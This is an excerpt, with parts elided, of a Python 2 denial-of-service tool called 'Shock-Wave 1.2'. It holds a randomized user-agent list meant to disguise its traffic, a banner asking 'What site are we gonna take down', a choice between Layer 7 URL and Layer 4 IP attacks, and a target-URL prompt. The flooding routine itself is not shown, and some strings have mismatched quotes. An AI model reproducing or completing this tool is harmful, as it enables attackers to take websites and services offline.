#Shock-wave.py re-edit
# by S0u1
# Author of script : Ala
...
def rc():
 print '\n\033[92m[*]Creating random strings...'
 print '\n\033[92m[*]Wait for 30 seconds....'
 global lis
 lis=[]
...
ua=["Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    ...
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)] Gecko/20090913 Firefox/3.5.3", "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)", "Mozilla/5.0 (PLAYSTATION 3; 3.55)", "Mozilla/5.0 (PLAYSTATION 3; 2.00)", "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)","Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
...
while n<2:
 print '\n\033[91m---------------------------------------------------'
 print '\n\033[91m-      ^-^   SET SAIL TO THE HORIZON!   ^-^       -'
 print '\n\033[91m-             /!\ Shock-Wave 1.2 /!\              -'
 print '\n\033[94m- [!]             ( REMASTERED ! )                -'
 print '\n\033[91m---------------------------------------------------'
 print '\n\033[93m- [!] Greetings, What site are we gonna take down -'
 print '\n\033[94m- [+]     Script edit by :  S0u1izg0d             -'
 print '\n\033[94m- [+] Thanks to : Ala-Toxic-Pr0t0x1c-LulzZombie   -'
 print '\n\033[91m---------------------------------------------------'
 try:
  a=input('\033[93m\n\nATTACK LAYER:\n 1-LAYER 7(for URL)\n 2-LAYER 4(IP)\n>')
  if (a==1) or (a==2):
...
if (a==1):
 while n<3:
  try:
   u=raw_input('\n\033[94mTARGET URL(www.example.com):\n>')
